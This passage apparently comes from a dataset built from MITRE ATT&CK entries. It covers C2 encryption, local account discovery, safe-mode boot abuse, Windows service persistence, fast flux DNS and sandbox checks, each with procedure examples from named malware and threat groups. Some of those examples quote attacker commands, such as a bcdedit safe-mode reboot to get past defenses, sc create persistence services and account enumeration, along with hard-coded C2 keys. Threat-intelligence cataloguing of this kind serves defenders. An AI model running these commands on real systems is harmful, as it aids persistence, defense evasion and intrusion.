a custom stream cipher.', '[Bonadan] can XOR-encrypt C2 communications.', '[Lucifer] can perform a decremental-xor encryption on the initial C2 request before sending it over the wire.', '[Taidoor] uses RC4 to encrypt the message body of HTTP content.', '[Hi-Zor] encrypts C2 traffic with a double XOR using two distinct single-byte keys.', '[FALLCHILL] encrypts C2 data with RC4 encryption.', 'During [Operation Dream Job] [Lazarus Group] used an AES key to communicate with their C2 server.', '[Mosquito] uses a custom encryption algorithm, which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm.', '[Dipsind] encrypts C2 data with AES256 in ECB mode.', '[CharmPower] can send additional modules over C2 encrypted with a simple substitution cipher.', '[BADCALL] encrypts C2 traffic using an XOR/ADD cipher.', '[WarzoneRAT] can encrypt its C2 with RC4 with the password `warzone160\\x00`.', ""Before being appended to image files, [HAMMERTOSS] commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command."", '[Uroburos] can encrypt the data beneath its http2 or tcp encryption at the session layer with CAST-128, using a different key for incoming and outgoing data.', '[SideTwist] can encrypt C2 communications with a randomly generated key.', '[OSX_OCEANLOTUS.D] encrypts data sent back to the C2 using AES in CBC mode with a null initialization vector (IV) and a key sent from the server that is padded to 32 bytes.', 'The C2 server response to a beacon sent by a variant of [Emissary] contains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants of [Emissary] use various XOR operations to encrypt C2 data.', 'The original variant of [FakeM] encrypts C2 traffic using a custom encryption cipher that uses an XOR key of “YHCRA” and bit rotation between each XOR operation. Some variants of [FakeM] use RC4 to encrypt C2 traffic.', '[QakBot] can RC4 encrypt strings in C2 communication.', 'Several [Lazarus Group] malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another [Lazarus Group] malware sample XORs C2 traffic. Other [Lazarus Group] malware uses Caracachs encryption to encrypt C2 payloads. [Lazarus Group] has also used AES to encrypt C2 traffic.', '[Mongall] has the ability to RC4 encrypt C2 communications.', '[Cardinal RAT] uses a secret key with a series of XOR and addition operations to encrypt C2 traffic.', '[Sakula] encodes C2 traffic with single-byte XOR keys.', '[ZIRCONIUM] has used AES encrypted communications in C2.', '[Volt Typhoon] has used a version of the Awen web shell that employed AES encryption and decryption for C2 communications.', '[Volgmer] uses a simple XOR cipher to encrypt traffic and files.', '[httpclient] encrypts C2 content with XOR using a single byte, 0x12.', '[LIGHTWIRE] can RC4 encrypt C2 commands.', '[HiddenWasp] uses an RC4-like algorithm with an already computed PRGA generated key-stream for network communication.', '[MoonWind] encrypts C2 traffic using RC4 with a static key.', '[Ninja] can XOR and AES encrypt C2 messages.', '[GrimAgent] can use an AES key to encrypt C2 communications.', 'Some versions of [UPPERCUT] have used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address.', '[4H RAT] obfuscates C2 communication using a 1-byte XOR with the key 0xBE.', '[Winnti for Linux] has used a custom TCP protocol with four-byte XOR for command and control (C2).', '[TrickBot] uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.Newer versions of [TrickBot] have been known to use `bcrypt` to encrypt and digitally sign responses to their C2 server. ', '[Stealth Falcon] malware encrypts C2 traffic using RC4 with a hard-coded key.', '[Stuxnet] encodes the payload of system information sent to the command and control servers using a one byte 0xFF XOR key. [Stuxnet] also uses a 31-byte long static byte string to XOR data sent to command and control servers. The servers use a different static key to encrypt replies to the implant.', '[Torisma] has encrypted its C2 communications using XOR and VEST-32.', '[Ebury] has encrypted C2 traffic using the client IP address, then encoded it as a hexadecimal string.', '[RDAT] has used AES ciphertext to encode C2 communications.', '[XCSSET] uses RC4 encryption over TCP to communicate with its C2 server.  ', '[Samurai] can encrypt C2 communications with AES.', '[ZIPLINE] can use AES-128-CBC to encrypt data for both upload and download.', '[Bazar] can send C2 communications with XOR encryption.', ""The [Duqu] command and control protocol's data stream can be encrypted with AES-CBC."", '[Rifdoor] has encrypted command and control (C2) communications with a stream cipher.', '[Hydraq] C2 traffic is encrypted using bitwise NOT and XOR operations.', '[BBSRAT] uses a custom encryption algorithm on data sent back to the C2 server over HTTP.', '[MuddyWater] has used AES to encrypt C2 responses.', 'A variant of [ADVSTORESHELL] encrypts some C2 with 3DES.', '[LightNeuron] uses AES to encrypt C2 traffic.', '[Explosive] has encrypted communications with the RC4 method. ', '[RTM] encrypts C2 traffic with a custom RC4 variant.', '[LookBack] uses a modified version of RC4 for data transfer.', '[TAINTEDSCRIBE] uses a Linear Feedback Shift Register (LFSR) algorithm for network encryption.', '[Kobalos] post-authentication communication channel uses a 32-byte-long password with RC4 for inbound and outbound traffic. ', '[gh0st RAT] uses RC4 and XOR to encrypt C2 traffic.', '[Mafalda] can encrypt its C2 traffic with RC4.', '[SombRAT] has encrypted its C2 communications with AES.', '[WellMess] can encrypt HTTP POST data using RC6 and a dynamically generated AES key encrypted with a hard coded RSA public key.', '[Downdelph] uses RC4 to encrypt C2 responses.', '[Comnie] encrypts command and control communications with RC4.', '[BendyBear] communicates to a C2 server over port 443 using modified RC4 and XOR-encrypted chunks. ', '[PipeMon] communications are RC4 encrypted.', '[HyperStack] has used RSA encryption for C2 communications.', '[Gazer] uses custom encryption for C2 that uses 3DES.', '[NGLite] will use an AES encrypted channel for command and control purposes, in one case using the key <code>WHATswrongwithUu</code>.', '[NanoCore] uses DES to encrypt the C2 traffic.', '[Derusbi] obfuscates C2 traffic with variable 4-byte XOR keys.', '[SLIGHTPULSE] can RC4 encrypt all incoming and outgoing C2 messages.', '[Carbanak] encrypts the message body of HTTP traffic with RC2 (in CBC mode). [Carbanak] also uses XOR with random keys for its communications.', '[xCaon] has encrypted data sent to the C2 server using a XOR key. ', '[Okrum] uses AES to encrypt network traffic. The key can be hardcoded or negotiated with the C2 server in the registration phase. ', '[Higaisa] used AES-128 to encrypt C2 traffic.', '[PoisonIvy] uses the Camellia cipher to encrypt communications.', '[Bumblebee] can encrypt C2 requests and responses with RC4', '[GreyEnergy] encrypts communications using AES256.', '[Sliver] can use AES-GCM-256 to encrypt a session key for C2 message exchange.', '[SodaMaster] can use RC4 to encrypt C2 communications.', '[RedLeaves] has encrypted C2 traffic with RC4, previously using keys of 88888888 and babybear.', '[FlawedAmmyy] has used SEAL encryption during the initial C2 handshake.', '[Epic] encrypts commands from the C2 server using a hardcoded key.', '[CallMe] uses AES to encrypt C2 traffic.', '[TSCookie] has encrypted network communications with RC4.', 'The [Komplex] C2 channel uses an 11-byte XOR algorithm to hide data.', '[PlugX] can use RC4 encryption in C2 communications.', '[WIREFIRE] can AES encrypt process output sent from compromised devices to C2.', '[Cobalt Strike] has the ability to use AES-256 symmetric encryption in CBC mode with HMAC-SHA-256 to encrypt task commands and XOR to encrypt shell code and configuration data.', '[SeaDuke] C2 traffic has been encrypted with RC4 and AES.', '[APT12] has used the [RIPTIDE] RAT, which communicates over HTTP with a payload encrypted with RC4.', '[H1N1] encrypts C2 traffic using an RC4 key.', '[Inception] has encrypted network communications with AES.', '[KONNI] has used AES to encrypt C2 traffic.', '[Daserf] uses RC4 encryption to obfuscate HTTP traffic.', '[ZeroT] has used RC4 to encrypt C2 traffic.', '[FatDuke] can AES encrypt C2 communications.', '[KEYMARBLE] uses a customized XOR algorithm to encrypt C2 communications.', '[Bandook] has used AES encryption for C2 communication.', 'The [IceApple] Result Retriever module can AES encrypt C2 responses.', '[APT33] has used AES for encryption of command and control traffic.', '[RainyDay] can use RC4 to encrypt C2 communications.', '[PLAINTEE] encodes C2 beacons using XOR.', '[FoggyWeb] has used a dynamic XOR key and custom XOR methodology for C2 communications.  ', '[BLINDINGCAN] has encrypted its C2 traffic with RC4.', '[ChChes] can encrypt C2 traffic with AES or RC4.', '[metaMain] can encrypt the data that it sends and receives from the C2 server using an RC4 encryption algorithm.', '[UBoatRAT] encrypts instructions in its C2 network payloads using a simple XOR cipher.', '[APT28] installed a Delphi backdoor that used a custom algorithm for C2 communications.', '[BRONZE BUTLER] has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic. [BRONZE BUTLER] has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.', '[Metamorfo] has encrypted C2 commands with AES-256. ', '[SNUGRIDE] encrypts C2 traffic using AES with a static key.', '[PLEAD] has used RC4 encryption to download modules.', '[CHOPSTICK] encrypts C2 communications with RC4.', '[CORESHELL] C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.', '[RotaJakiro] encrypts C2 communication using a combination of AES, XOR, ROTATE encryption, and ZLIB compression.', '[down_new] has the ability to AES encrypt C2 communications.', 'Some [Felismus] samples use a custom encryption method for C2 traffic that utilizes AES and multiple keys.', 'During [Frankenstein] the threat actors communicated with C2 via an encrypted RC4 byte stream and AES-CBC.', '[Nebulae] can use RC4 and XOR to encrypt C2 communications.', '[Woody RAT] can use AES-CBC to encrypt data sent to its C2 server. ', '[CosmicDuke] contains a custom version of the RC4 algorithm that includes a programming error.', '[PingPull] can use AES, in cipher block chaining (CBC) mode padded with PKCS5, to encrypt C2 server communications.', '[Frankenstein] has communicated with a C2 via an encrypted RC4 byte stream and AES-CBC.']",False
T1087.001,Local Account,"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.  Commands such as <code>net user</code> and <code>net localgroup</code> of the [Net] utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts.","['[USBferry] can use <code>net user</code> to gather information about local accounts.\t', '[Agent Tesla] can collect account information from the victim’s machine.', '[Kwampirs] collects a list of accounts with the command <code>net users</code>.', '[Ke3chang] performs account discovery using commands such as <code>net localgroup administrators</code> and <code>net group ""REDACTED"" /domain</code> on specific permissions groups.', 'Commands under <code>net user</code> can be used in [Net] to gather information about and manipulate user accounts.', '[Moses Staff] has collected the administrator username from a compromised host.', '[PUNCHBUGGY] can gather user names.', '[POWERSTATS] can retrieve usernames from compromised hosts.', 'The discovery modules used with [Duqu] can collect information on accounts and permissions.', '[GeminiDuke] collects information on local user accounts from the victim.', '[OSInfo] enumerates local and domain users', '[SHOTPUT] has a command to retrieve information about connected users.', '[OilRig] has run <code>net user</code>, <code>net user /domain</code>, <code>net group “domain admins” /domain</code>, and <code>net group “Exchange Trusted Subsystem” /domain</code> to get account listings on a victim.', '[PoshC2] can enumerate local and domain user account information.', '[Comnie] uses the <code>net user</code> command.', '[APT41] used built-in <code>net</code> commands to enumerate local administrator groups.', '[APT32] enumerated administrative users using the commands <code>net localgroup administrators</code>.', '[BloodHound] can identify users with local administrator rights.', 'During [Operation CuckooBees] the threat actors used the `net user` command to gather account information.', '[TrickBot] collects the users of the system.', '[RATANKBA] uses the <code>net user</code> command.', '[Chimera] has used <code>net user</code> for account discovery.', '[Turla] has used <code>net user</code> to enumerate local accounts on the system.', '[Fox Kitten] has accessed ntuser.dat and UserClass.dat on compromised hosts.', '[Epic] gathers a list of all user accounts, privilege classes, and time of last logon.', '[SoreFang] can collect usernames from the local system via <code>net.exe user</code>.', '[APT3] has used a tool that can obtain info about local and global group users, power users, and administrators.', '[Remsec] can obtain a list of users.', '[Mis-Type] may create a file containing the results of the command <code>cmd.exe /c net user {Username}</code>.', '[Bankshot] gathers domain and account names/information through process monitoring.', '[InvisiMole] has a command to list account information on the victim’s machine.', '[Milan] has run `C:\\Windows\\system32\\cmd.exe /c cmd /c dir c:\\users\\ /s 2>&1` to discover local accounts.', '[Threat Group-3390] has used <code>net user</code> to conduct internal discovery of systems.', '[Stuxnet] enumerates user accounts of the local host.', '[PowerSploit] <code>Get-ProcessTokenGroup</code> Privesc-PowerUp module can enumerate all SIDs associated with its current token.', '[Poseidon Group] searches for administrator accounts on both the local victim machine and the network.', '[Empire] can acquire local and domain user account information.', '[Pupy] uses PowerView and Pywerview to perform discovery commands such as net user, net group, net local group, etc.', '[admin@338] actors used the following commands following exploitation of a machine with [LOWBALL] malware to enumerate user accounts: <code>net user >> %temp%\\download</code> <code>net user /domain >> %temp%\\download</code>', '[HyperStack] can enumerate all account names on a remote share.', '[Elise] executes <code>net user</code> after initial communication is made to the remote server.', '[Bazar] can identify administrator accounts on an infected host.', '[APT1] used the commands <code>net localgroup</code>,<code>net user</code>, and <code>net group</code> to find accounts on the system.', '[BitPaymer] can enumerate the sessions for each user logged onto the infected host.', '[Pony] has used the <code>NetUserEnum</code> function to enumerate local accounts.\t', '[Valak] has the ability to enumerate local admin accounts.', '[Kazuar] gathers information on local groups and members on the victim’s machine.', '[SMOKEDHAM] has used <code>net.exe user</code> and <code>net.exe users</code> to enumerate local accounts on a compromised host.', '[MURKYTOP] has the capability to retrieve information about users on remote hosts.', '[P.A.S. Webshell] can display the /etc/passwd file on a compromised host.', '[S-Type] has run the command `net user` on a victim.']",False
T1586.001,Social Media Accounts,"Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts] adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona.   A variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information] purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps). Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.  Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.  Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others. Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service]","['[Sandworm Team] creates credential capture webpages to compromise existing, legitimate social media accounts.', '[Leviathan] has compromised social media accounts to conduct social engineering attacks.']",
T1562.009,Safe Mode Boot,"Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.  Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.  Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry] Malicious [Component Object Model] (COM) objects may also be registered and loaded in safe mode.","['[REvil] can force a reboot in safe mode with networking.', '[Black Basta] can reboot victim machines in safe mode with networking via `bcdedit /set safeboot network`.', '[AvosLocker] can restart a compromised machine in safe mode. ']",
T1542.005,TFTP Boot,"Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.  Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image] to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit] and may result in the network device running a modified image. ",[],
T1543.003,Windows Service,"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.  Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API.   Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API] functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry] or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as [Rootkit] to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as ""Bring Your Own Vulnerable Driver"" (BYOVD)) as part of [Exploitation for Privilege Escalation]  Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution]  To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service] (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden’ services (i.e., [Hide Artifacts] for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.","['[NightClub] has created a Windows service named `WmdmPmSp` to establish persistence.', '[Industroyer] can use an arbitrary system service to load at system boot for persistence and replaces the ImagePath registry value of a Windows service with a new backdoor binary. ', '[Tropic Trooper] has installed a service pointing to a malicious DLL dropped to disk.', '[FunnyDream] has established persistence by running `sc.exe` and by setting the `WSearch` service to run automatically.', '[Winnti for Windows] sets its DLL file as a new service in the Registry to establish persistence.', '[Cuba] can modify services by using the <code>OpenService</code> and <code>ChangeServiceConfig</code> functions. ', '[Briba] installs a service pointing to a malicious DLL dropped to disk.', '[DCSrv] has created new services for persistence by modifying the Registry.', '[WastedLocker] created and established a service that runs until the encryption process is complete. ', '[GoldenSpy] has established persistence by running in the background as an autostart service.\t', 'During [Operation CuckooBees] the threat actors modified the `IKEEXT` and `PrintNotify` Windows services for persistence.', '[DarkVishnya] created new services for shellcode loaders distribution.', ""[Volgmer] installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry. Some [Volgmer] variants also install .dll files as services with names generated by a list of hard-coded strings."", '[MoonWind] installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance.', '[CosmicDuke] uses Windows services typically named ""javamtsup"" for persistence.', '[PoisonIvy] creates a Registry subkey that registers a new service. [PoisonIvy] also creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.', '[STARWHALE] has the ability to create the following Windows service to establish persistence on an infected host: `sc create Windowscarpstss binpath= ""cmd.exe /c cscript.exe c:\\\\windows\\\\system32\\\\w7_1.wsf humpback_whale"" start= ""auto"" obj= ""LocalSystem""`.', '[ZeroT] can add a new service to ensure [PlugX] persists on the system when delivered as another payload onto the system.', '[Gelsemium] can drop itself in `C:\\Windows\\System32\\spool\\prtprocs\\x64\\winprint.dll` as an alternative Print Processor to be loaded automatically when the spoolsv Windows service starts.', '[APT38] has installed a new Windows service to establish persistence.', '[QakBot] can remotely create a temporary service on a target host.', '[Conficker] copies itself into the <code>%systemroot%\\system32</code> directory and registers as a service.', '[GreyEnergy] chooses a service, drops a DLL file, and writes it to that serviceDLL Registry key.', '[APT41] modified legitimate Windows services to install malware backdoors. [APT41] created the StorSyncSvc service to provide persistence for Cobalt Strike.', '[KeyBoy] installs a service pointing to a malicious DLL dropped to disk.', '[Wizard Spider] has installed [TrickBot] as a service named ControlServiceA in order to establish persistence. ', '[Elise] configures itself as a service.', 'To establish persistence, [Okrum] can install itself as a new service named NtmSsvc.', '[Blue Mockingbird] has made their XMRIG payloads persistent as a Windows Service.', '[TeamTNT] has used malware that adds cryptocurrency miners as a service.', '[AppleJeus] can install itself as a service. ', '[Dtrack] can add a service called WBService to establish persistence.', '[Stuxnet] uses a driver registered as a boot start service as the main load-point.', '[zwShell] has established persistence by adding itself as a new service.', '[SILENTTRINITY] can establish persistence by creating a new service.', '[ZLib] creates Registry keys to allow itself to run as various services.', '[Bisonal] has been modified to be used as a Windows service. ', '[PsExec] can leverage Windows services to escalate privileges from administrator to SYSTEM with the <code>-s</code> argument.', '[ThreatNeedle] can run in memory and register its payload as a Windows service.', '[Duqu] creates a new service that loads a malicious driver when the system starts. When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key.', 'An [APT19] Port 22 malware variant registers itself as a service.', '[Shamoon] creates a new service named “ntssrv” to execute the payload. Newer versions create the ""MaintenaceSrv"" and ""hdv_725x"" services.', '[TrickBot] establishes persistence by creating an autostart service that allows it to run whenever the machine boots.', '[StreamEx] establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.', '[Kwampirs] creates a new service named WmiApSrvEx to establish persistence.', '[SLOTHFULMEDIA] has created a service on victim machines named ""TaskFrame"" to establish persistence.', '[Bankshot] can terminate a specific process by its process id.', '[Cobalt Strike] can install a new service.', '[Pandora] has the ability to gain system privileges through Windows services.', '[RDAT] has created a service when it is installed on the victim machine.\t', '[PowerSploit] contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries, paths, and configs.', '[Carbon] establishes persistence by creating a service and naming it based off the operating system version running on the current machine.', '[Threat Group-3390] malware can create a new service, sometimes naming it after the config information, to gain persistence.', '[Wiarp] creates a backdoor through which remote attackers can create a service.', '[Nerex] creates a Registry subkey that registers a new service.', '[Catchamas] adds a new service named NetAdapter to establish persistence.', '[Samurai] can create a service at `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost` to trigger execution and maintain persistence.', '[Hydraq] creates new services to establish persistence.', '[PlugX] can be added as a service to establish persistence. [PlugX] also has a module to change service configurations as well as start, control, and delete services.', '[Ke3chang] backdoor RoyalDNS established persistence through adding a service called <code>Nwsapagent</code>.', '[LoudMiner] can automatically launch a Linux virtual machine as a service at startup if the AutoStart option is enabled in the VBoxVmService configuration file.', '[PROMETHIUM] has created new services and modified existing services for persistence.', '[Attor] dispatcher can establish persistence by registering a new service.', '[Kazuar] can install itself as a new service.', '[Ursnif] has registered itself as a system service in the Registry for automatic execution at system startup.', '[SUGARUSH] has created a service named `Service1` for persistence.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used an arbitrary system service to load at system boot for persistence for [Industroyer] They also replaced the ImagePath registry value of a Windows service with a new backdoor binary. ', '[hcdLoader] installs itself as a service for persistence.', '[BitPaymer] has attempted to install itself as a service to maintain persistence.', '[PingPull] has the ability to install itself as a service.', '[TinyZBot] can install as a Windows service for persistence.', 'The [Exaramel for Windows] dropper creates and starts a Windows service named wsmprovav with the description “Windows Check AV.”', '[Anchor] can establish persistence by creating a service.\t', '[KONNI] has registered itself as a service using its export function. ', '[ZxShell] can create a new service using the service parser function ProcessScCommand. ', '[RainyDay] can use services to establish persistence.', '[BBSRAT] can modify service configurations.', '[InvisiMole] can register a Windows service named CsPower as part of its execution chain, and a Windows service named clr_optimization_v2.0.51527_X86 to achieve persistence.', '[APT32] modified Windows Services to ensure PowerShell scripts were loaded on the system. [APT32] also creates a Windows service to establish persistence.', '[TEARDROP] ran as a Windows service from the <code>c:\\windows\\syswow64</code> folder.', '[Nebulae] can create a service to establish persistence.', '[FinFisher] creates a new Windows service with the malicious executable for persistence.', '[StrongPity] has created new services and modified existing services for persistence.', '[Black Basta] can create a new service to establish persistence.', '[Seasalt] is capable of installing itself as a service.', '[Wingbird] uses services.exe to register a new autostart service named ""Audit Service"" using a copy of the local lsass.exe file.', 'During [Operation Honeybee] threat actors installed DLLs and backdoors as Windows services.', '[gh0st RAT] can create a new service to establish persistence.', '[Carbanak] malware installs itself as a service to provide persistence and SYSTEM privileges.', '[Uroburos] has registered a service, typically named `WerFaultSvc`, to decrypt and find a kernel driver and kernel driver loader to maintain persistence.', '[JHUHUGIT] has registered itself as a service to establish persistence.', '[Naid] creates a new service to establish.', '[Ragnar Locker] has used sc.exe to create a new service for the VirtualBox driver.', '[Ninja] can create the services `httpsvc` and `w3esvc` for persistence .', '[APT3] has a tool that creates a new service for persistence.', '[FIN7] created new Windows services and added them to the startup directories for persistence.', 'Some [InnaputRAT] variants create a new Windows service to establish persistence.', 'One variant of [BlackEnergy] creates a new service using either a hard-coded or randomly generated name.', '[Kimsuky] has created new services for persistence.', '[ShimRat] has installed a Windows service to maintain persistence on victim machines.', 'One persistence mechanism used by [CozyCar] is to register itself as a Windows service.', '[Clambling] can register itself as a system service to gain persistence.', '[TYPEFRAME] variants can add malicious DLL modules as new services.[TYPEFRAME] can also delete services from the victim’s machine.', '[HermeticWiper] can load drivers by creating a new service using the `CreateServiceW` API.', '[Earth Lusca] created a service using the command <code>sc create “SysUpdate” binpath= “cmd /c start “[file path]””&&sc config “SysUpdate” start= auto&&net start SysUpdate</code> for persistence.', '[RawPOS] installs itself as a service to maintain persistence.', '[Cobalt Group] has created new services to establish persistence.', 'Some [Sakula] samples install themselves as services for persistence by calling WinExec with the <code>net start</code> argument.', 'If running as administrator, [TDTESS] installs itself as a new service named bmwappushservice to establish persistence.', 'Several [Lazarus Group] malware families install themselves as new services.', '[AuditCred] is installed as a new service on the system.', '[PipeMon] can establish persistence by registering a malicious DLL as an alternative Print Processor which is loaded when the print spooler service starts.', '[Cinnamon Tempest] has created system services to establish persistence for deployed tooling.', '[Dyre] registers itself as a service by adding several Registry keys.', '[Emissary] is capable of configuring itself as a service.', '[Empire] can utilize built-in modules to modify service binaries and restore them to their original state.', '[Emotet] has been observed creating new services to maintain persistence. ', '[Reaver] installs itself as a new service.', '[FALLCHILL] has been installed as a Windows service.', '[SysUpdate] can create a service to establish persistence.', '[Nidiran] can create a new service named msamger (Microsoft Security Accounts Manager).', '[WannaCry] creates the service ""mssecsvc2.0"" with the display name ""Microsoft Security Center (2.0) Service.""', '[Honeybee] has batch files that modify the system service COMSysApp to load a malicious DLL.', '[Cobalt Strike] can install a new service.']",False
T1568.001,Fast Flux DNS,"Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.  The simplest, ""single-flux"" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.  In contrast, the ""double-flux"" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.","['[Amadey] has used fast flux DNS for its C2.', '[menuPass] has used dynamic DNS service providers to host malicious domains.', '[TA505] has used fast flux to mask botnets by distributing payloads across multiple IPs.', '[gh0st RAT] operators have used dynamic DNS to mask the true location of their C2 behind rapidly changing IP addresses.', '[njRAT] has used a fast flux DNS for C2 IP resolution.', '[Machete] has used free dynamic DNS domains for C2.']",
T1497.001,System Checks,"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion] during automated discovery to shape follow-on behaviors.  Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation] [PowerShell] [System Information Discovery] and [Query Registry] to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment.   Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use [File and Directory Discovery] to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.  Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.    Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.","['[QakBot] can check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found.', '[Denis] ran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis.', '[SodaMaster] can check for the presence of the Registry key <code>HKEY_CLASSES_ROOT\\\\Applications\\\\VMwareHostOpen.exe</code> before proceeding to its main functionality.\t ', '[Okrum] loader can check the amount of physical memory and terminates itself if the host has less than 1.5 Gigabytes of physical memory in total.', '[InvisiMole] can check for artifacts of VirtualBox, Virtual PC and VMware environment, and terminate itself if they are detected.', '[Evilnum] has used a component called TerraLoader to check certain hardware and file information to detect sandboxed environments. ', '[Dyre] can detect sandbox analysis environments by inspecting the process list and Registry.', 'During [Operation Dream Job] [Lazarus Group] used tools that conducted a variety of system checks to detect sandboxes or VMware services.', '[Attor] can detect whether it is executed in some virtualized or emulated environment by searching for specific artifacts, such as communication with I/O ports and using VM-specific instructions.', '[Bumblebee] has the ability to search for designated file paths and Registry keys that indicate a virtualized environment from multiple products.', '[FinFisher] obtains the hardware device list and checks if the MD5 of the vendor ID is equal to a predefined list in order to check for sandbox/virtualized environments.', ""[Astaroth] can check for Windows product ID's used by sandboxes and usernames and disk serial numbers associated with analyst environments."", '[SynAck] checks its directory location in an attempt to avoid launching in a sandbox.', '[MegaCortex] has checked the number of CPUs in the system to avoid being run in a sandbox or emulator. ', '[OSX_OCEANLOTUS.D] checks a number of system parameters to see if it is being run on real hardware or in a virtual machine environment, such as `sysctl hw.model` and the kernel boot time.', '[macOS.OSAMiner] can parse the output of the native `system_profiler` tool to determine if the machine is running with 4 cores.', '[Smoke Loader] scans processes to perform anti-VM checks. ', '[GuLoader] has the ability to perform anti-VM and anti-sandbox checks using string hashing, the API call <code>EnumWindows</code>, and checking for Qemu guest agent.', 